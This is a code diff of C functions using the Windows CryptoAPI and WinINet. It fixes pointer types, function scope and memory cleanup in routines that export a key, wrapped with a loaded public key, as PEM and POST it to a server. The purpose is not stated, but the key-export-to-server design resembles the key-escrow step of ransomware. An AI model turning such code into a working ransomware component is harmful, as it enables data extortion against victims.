@@ -3,7 +3,7 @@
 // static functions
 static BOOL LoadPublicKey(HCRYPTPROV* hProv, HCRYPTKEY* hKey);
 static BOOL SendKeyOverHTTP(const char* serverName, const char* postData);
-static BOOL ExportToPEM(HCRYPTKEY hKey, HCRYPTKEY hPubKey, char* keyEncoded);
+static BOOL ExportToPEM(HCRYPTKEY hKey, HCRYPTKEY hPubKey, char** keyEncoded);
 static BOOL LoadKeyFromFile(HCRYPTPROV* hCryptProv, HCRYPTKEY* hKey, const char* keyFileName);
 
 // Initialize the crypto environment, hCryptProv will point to the crypt provider and hKey to the key handler
@@ -21,7 +21,7 @@ BOOL InitCrypto(HCRYPTPROV* hCryptProv, HCRYPTKEY* hKey) {
 
         // Release the crypto provider handle.
         if (hCryptProv) {
-            if (!(CryptReleaseContext(hCryptProv, 0))) {
+            if (!(CryptReleaseContext(*hCryptProv, 0))) {
                 printf("Error during CryptReleaseContext!. Error code: %lu\n", GetLastError());
             }
         }
@@ -93,7 +93,7 @@ BOOL LoadPublicKey(HCRYPTPROV* hProv, HCRYPTKEY* hKey) {
     return TRUE;
 }
 
-BOOL ExportToPEM(HCRYPTKEY hKey, HCRYPTKEY hPubKey, char** keyEncoded) {
+static BOOL ExportToPEM(HCRYPTKEY hKey, HCRYPTKEY hPubKey, char** keyEncoded) {
     DWORD keyBlobSize = 0;                  // to store the size of the key blob
     DWORD keyEncodedSize = 0;               // to store the size of the encoded key
     
@@ -151,7 +151,7 @@ cleanup:
     return success;
 }
 
-BOOL SendKeyOverHTTP(const char* serverName, const char* postData) {
+static BOOL SendKeyOverHTTP(const char* serverName, const char* postData) {
     HINTERNET hInternet = NULL, hConnect = NULL, hRequest = NULL;       // The connection handlers
     const char* resource = "/index.html";                               // Hardcoded resource
     BOOL success = FALSE;                                               // Success flag
@@ -206,7 +206,7 @@ BOOL ExportKey(HCRYPTPROV hCryptProv, HCRYPTKEY hKey, const char* serverName) {
     HCRYPTKEY hPubKey = 0;                  // the public key handler
     char** keyEncoded = NULL;                // to store the encoded key
 
-    keyEncoded = (char*)malloc(sizeof(char*));
+    keyEncoded = malloc(sizeof(char*));
     if (!keyEncoded) {
         printf("Error: Cannot allocate memory for keyEncoded. Error Code: %lu\n", GetLastError());
         goto cleanup;
@@ -236,8 +236,10 @@ BOOL ExportKey(HCRYPTPROV hCryptProv, HCRYPTKEY hKey, const char* serverName) {
 cleanup:
     // Clean up
     if (hPubKey) { CryptDestroyKey(hPubKey); }
-    if (*keyEncoded) { free(*keyEncoded); }
-    if (keyEncoded) { free(keyEncoded); }
+    if (keyEncoded) {
+        if (*keyEncoded) { free(*keyEncoded); }
+        free(keyEncoded);
+    }
 
     return success;
 }
